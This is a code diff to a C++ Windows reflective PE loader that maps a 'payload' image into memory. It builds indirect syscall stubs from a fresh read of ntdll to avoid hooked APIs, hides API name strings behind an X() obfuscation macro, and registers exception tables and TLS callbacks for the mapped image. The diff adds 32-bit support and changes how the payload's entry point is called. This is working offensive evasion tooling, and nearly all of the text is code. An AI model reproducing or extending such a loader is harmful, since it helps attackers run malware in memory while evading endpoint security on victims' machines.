@@ -436,6 +436,7 @@ static bool FindExportRva(const std::vector<uint8_t>& img, const char* name,
     return false;
 }
 
+#if defined(_M_X64) || defined(_M_ARM64)
 static uint8_t* g_stubMem = nullptr;
 static size_t g_stubUsed = 0;
 
@@ -492,6 +493,7 @@ static void* NewSyscallStub(uint32_t ssn, uintptr_t syscallVa) {
     if (!VirtualProtect(g_stubMem, 4096, PAGE_EXECUTE_READ, &tmp)) return nullptr;
     return p;
 }
+#endif
 
 struct Sys {
     NtAllocateVirtualMemory_t Alloc = nullptr;
@@ -499,22 +501,26 @@ struct Sys {
     NtSetInformationThread_t SetThreadInfo = nullptr;
 
     bool Init() {
+#if defined(_M_X64) || defined(_M_ARM64)
         wchar_t sys[MAX_PATH]{};
-        if (!GetSystemDirectoryW(sys, MAX_PATH)) return false;
-        if (!ReadAllBytes(std::wstring(sys) + L"\\ntdll.dll", g_ntdllFile)) return false;
+        if (GetSystemDirectoryW(sys, MAX_PATH)) {
+            if (ReadAllBytes(std::wstring(sys) + L"\\ntdll.dll", g_ntdllFile)) {
+                uint32_t ssn = 0;
+                uintptr_t va = SyscallVaFor(X("NtAllocateVirtualMemory").c_str(), ssn);
+                if (va) Alloc = (NtAllocateVirtualMemory_t)NewSyscallStub(ssn, va);
+                ssn = 0;
+                va = SyscallVaFor(X("NtProtectVirtualMemory").c_str(), ssn);
+                if (va) Protect = (NtProtectVirtualMemory_t)NewSyscallStub(ssn, va);
+                ssn = 0;
+                va = SyscallVaFor(X("NtSetInformationThread").c_str(), ssn);
+                if (va) SetThreadInfo = (NtSetInformationThread_t)NewSyscallStub(ssn, va);
+            }
+        }
+#endif
 
-        uint32_t ssn = 0;
-        uintptr_t va = SyscallVaFor(X("NtAllocateVirtualMemory").c_str(), ssn);
-        if (va) Alloc = (NtAllocateVirtualMemory_t)NewSyscallStub(ssn, va);
-        ssn = 0;
-        va = SyscallVaFor(X("NtProtectVirtualMemory").c_str(), ssn);
-        if (va) Protect = (NtProtectVirtualMemory_t)NewSyscallStub(ssn, va);
-        ssn = 0;
-        va = SyscallVaFor(X("NtSetInformationThread").c_str(), ssn);
-        if (va) SetThreadInfo = (NtSetInformationThread_t)NewSyscallStub(ssn, va);
-
-        // Fallbacks keep the loader working on builds where the stub layout
-        // is unexpected (e.g. future ntdll variants).
+        // x86 and ntdll variants without a recognizable stub use the exported
+        // Nt* entry points. The loader remains functional; only the indirect
+        // syscall hardening is skipped on those builds.
         HMODULE h = GetModuleHandleW(W(X("ntdll.dll")).c_str());
         if (!Alloc && h) Alloc = (NtAllocateVirtualMemory_t)GetProcAddress(h, X("NtAllocateVirtualMemory").c_str());
         if (!Protect && h) Protect = (NtProtectVirtualMemory_t)GetProcAddress(h, X("NtProtectVirtualMemory").c_str());
@@ -664,12 +670,19 @@ namespace reflect {
             for (DWORD i = 0; i < count; i++) {
                 WORD type = entries[i] >> 12;
                 WORD off = entries[i] & 0x0FFF;
-                if (type == IMAGE_REL_BASED_DIR64) {
+                if (type == IMAGE_REL_BASED_DIR64 && sizeof(void*) == 8) {
                     uint64_t target = (uint64_t)rel->VirtualAddress + off;
-                    if (target + sizeof(ULONG_PTR) > imageSize)
+                    if (target + sizeof(uint64_t) > imageSize)
                         return false;
-                    auto slot = (ULONG_PTR*)(base + target);
-                    *slot += delta;
+                    auto slot = (uint64_t*)(base + target);
+                    *slot += (uint64_t)delta;
+                }
+                else if (type == IMAGE_REL_BASED_HIGHLOW && sizeof(void*) == 4) {
+                    uint32_t target = rel->VirtualAddress + off;
+                    if (target + sizeof(uint32_t) > imageSize)
+                        return false;
+                    auto slot = (uint32_t*)(base + target);
+                    *slot += (uint32_t)delta;
                 }
             }
             rel = (PIMAGE_BASE_RELOCATION)((uint8_t*)rel + rel->SizeOfBlock);
@@ -736,6 +749,7 @@ namespace reflect {
         return true;
     }
 
+#if defined(_M_X64) || defined(_M_ARM64)
     // x64 SEH only works for a manually mapped image if its .pdata is
     // registered with the OS. Without this, __try/__except in the payload
     // cannot unwind and a single fault kills the process.
@@ -754,6 +768,12 @@ namespace reflect {
         VLog("[*] exception table: %u entries registered=%d", count, ok ? 1 : 0);
         return ok != FALSE;
     }
+#else
+    // x86 uses SEH registration on the stack, not .pdata.
+    static bool RegisterExceptionTable(uint8_t*, PIMAGE_NT_HEADERS) {
+        return true;
+    }
+#endif
 
     static void RunTlsCallbacks(uint8_t* base, PIMAGE_NT_HEADERS nt) {
         auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
@@ -777,8 +797,13 @@ namespace reflect {
 
         auto nt = (const IMAGE_NT_HEADERS*)(data.data() + dos->e_lfanew);
         if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
-        if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
-            VLog("[!] payload is not PE32+");
+#if defined(_M_X64) || defined(_M_ARM64)
+        const WORD expectedMagic = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
+#else
+        const WORD expectedMagic = IMAGE_NT_OPTIONAL_HDR32_MAGIC;
+#endif
+        if (nt->OptionalHeader.Magic != expectedMagic) {
+            VLog("[!] payload architecture does not match loader");
             return false;
         }
 
@@ -1149,9 +1174,9 @@ int wmain(int argc, wchar_t** argv) {
         VLog("[!] invalid entry point");
         return 7;
     }
-    using EntryFn = int(__stdcall*)(HINSTANCE, DWORD, LPVOID);
+    using EntryFn = int(__cdecl*)();
     auto entry = (EntryFn)(image + ntImage->OptionalHeader.AddressOfEntryPoint);
     VLog("[*] jumping to entry");
-    int rc = entry((HINSTANCE)image, DLL_PROCESS_ATTACH, nullptr);
+    int rc = entry();
     return rc;
 }
